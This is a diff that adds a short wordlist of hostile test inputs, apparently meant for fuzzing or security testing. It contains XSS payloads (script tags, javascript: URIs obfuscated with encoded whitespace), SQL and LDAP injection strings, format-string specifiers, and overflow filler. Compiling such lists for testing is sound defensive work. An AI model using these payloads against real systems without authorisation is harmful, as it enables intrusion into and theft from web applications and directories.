@@ -1,0 +1,22 @@
+>"><script>alert("mwahahhaha")</script>&
+"><STYLE>@import"javascript:alert('mwahahhaha')";</STYLE>
+'%uff1cscript%uff1ealert('mwahahhaha')%uff1c/script%uff1e'
+<IMG SRC="jav&#x09;ascript:alert(<WBR>'mwahahhaha');">
+<IMG SRC="jav&#x0A;ascript:alert(<WBR>'mwahahhaha');">
+<IMG SRC="jav&#x0D;ascript:alert(<WBR>'mwahahhaha');">
+' OR 1=1 #
+<script>alert("mwahahhaha")</script>
+-1
+%%20s
+%s%s%s%s%s%s%s%s%s%s
+' group by userid having 1=1--
+' or 1 in (select @@version)--
+%22+or+isnull%281%2F0%29+%2F*
+admin*
+admin*)((|userPassword=*)
+*)(uid=*))(|(uid=*
+/
+//
+//*
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+0xfffffffffffffffffffffff
